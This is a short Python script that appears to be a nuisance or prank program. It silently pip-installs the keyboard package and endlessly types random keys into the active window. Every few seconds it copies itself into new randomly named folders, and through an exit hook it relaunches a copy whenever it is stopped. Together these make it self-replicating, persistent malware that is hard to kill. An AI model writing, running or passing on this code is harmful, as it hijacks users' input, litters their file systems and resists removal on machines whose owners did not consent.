#Created by aft9295
import random
import time
import os
import subprocess
import shutil
import atexit
import sys
subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
import keyboard

# Define the set of keys that will be randomly pressed
key_set = list('abcdefghijklmnopqrstuvwxyz0123456789')  # Add more keys as needed

# Function to simulate random key strokes
def random_key_strokes(num_strokes=50, min_delay=0.1, max_delay=0.5):
    """
    Simulate random key strokes.
    
    Args:
    - num_strokes (int): Number of random key strokes to simulate.
    - min_delay (float): Minimum delay between key presses.
    - max_delay (float): Maximum delay between key presses.
    """
    for _ in range(num_strokes):
        # Select a random key from the key_set
        key = random.choice(key_set)
        
        # Simulate pressing and releasing the key
        keyboard.press_and_release(key)
        
        # Wait for a random amount of time between key presses
        time.sleep(random.uniform(min_delay, max_delay))


# Function to create backups of this script in random folders
def create_backup():
    """
    Create a backup of the current script in a randomly named folder.
    """
    # Get the current script's file name
    script_name = os.path.basename(__file__)
    
    # Create a random directory path
    random_folder = os.path.join(os.getcwd(), ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)))
    
    # Create the directory if it doesn't exist
    os.makedirs(random_folder, exist_ok=True)
    
    # Define the backup file path
    backup_file = os.path.join(random_folder, script_name)
    
    # Copy the current script to the backup location
    shutil.copy(__file__, backup_file)
    
    print(f"Backup created at: {backup_file}")
    
    return backup_file

# Function to restart the script from a backup if it stops
def restart_from_backup():
    """
    Attempt to restart the script from a backup if it is interrupted.
    """
    backup_file = create_backup()
    
    print(f"Restarting script from backup: {backup_file}")
    
    # Use subprocess to launch the backup file as a new process
    subprocess.Popen([sys.executable, backup_file])

# Register the restart_from_backup function to be called when the script exits
atexit.register(restart_from_backup)

# Run the random key strokes simulation
if __name__ == "__main__":
    create_backup()
    while True:
        random_key_strokes()
        time.sleep(5)
        create_backup()
